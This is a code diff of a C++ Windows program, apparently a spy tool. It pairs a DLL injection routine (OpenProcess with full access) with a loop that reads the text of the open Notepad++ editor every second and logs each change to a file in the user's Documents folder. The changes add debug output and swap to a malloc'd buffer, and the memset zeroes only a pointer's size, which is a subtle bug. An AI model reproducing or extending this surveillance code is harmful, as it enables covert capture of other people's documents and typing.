@@ -5,7 +5,9 @@
 #include <string>
 #include <shlobj.h>
 #include <fstream>
-#include <knownfolders.h>  // for FOLDERID_Documents
+#include <knownfolders.h>  
+#include <codecvt>
+#include <locale>
 
 void InjectDLL(DWORD pid, LPCSTR dllPath) {
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
@@ -52,6 +54,8 @@ void InjectDLL(DWORD pid, LPCSTR dllPath) {
 //}
 
 void startSpy(HWND hwnd) {
+    std::cout << "SpyAction Started. if you close this program, then automatically spy will quit." << std::endl;
+    
     std::string previousText;
 
     // Get the path to the "My Documents" folder
@@ -66,8 +70,11 @@ void startSpy(HWND hwnd) {
 
     /*std::cout << myDocumentsPath << std::endl;*/
     /*Create the full path for the log file*/
+
+    /*std::locale loc(std::locale(), new std::codecvt_utf8_utf16<wchar_t>);*/
+
     while (true) {
-        if (FindWindow(L"Notepad++", NULL) == NULL) {
+        if (!FindWindow(L"Notepad++", NULL)) {
             std::cout << "Notepad++ has been closed. Stopping spy process." << std::endl;
             break;
         }
@@ -75,10 +82,15 @@ void startSpy(HWND hwnd) {
         if (hEdit) {
             LRESULT textLength = SendMessage(hEdit, WM_GETTEXTLENGTH, 0, 0);
             if (textLength >= 0) {
-                std::string buffer(textLength + 1, '\0');
-                SendMessageA(hEdit, WM_GETTEXT, (WPARAM)(textLength + 1), (LPARAM)buffer.data());
-                if (buffer != previousText) {
+                /*std::string buffer(textLength + 1, '\0');*/
+                char* buffer = (char*)malloc(textLength + 1);
+                memset(buffer, 0, sizeof(buffer));
+                SendMessageA(hEdit, WM_GETTEXT, (WPARAM)(textLength + 1), (LPARAM)buffer);
+                std::cout << buffer << std::endl;
+                if (strcmp(buffer,previousText.c_str())) {
                     std::ofstream logFile(myDocumentsPath);
+                    std::cout << "detect!!" << std::endl;
+                    //logFile.imbue(loc);  // Set UTF-8 locale
                     if (logFile.is_open()) {
                         logFile << buffer << std::endl;
                         logFile.close();
@@ -88,6 +100,7 @@ void startSpy(HWND hwnd) {
                     }
                     previousText = buffer;
                 }
+                free(buffer);
             }
         }
         Sleep(1000);
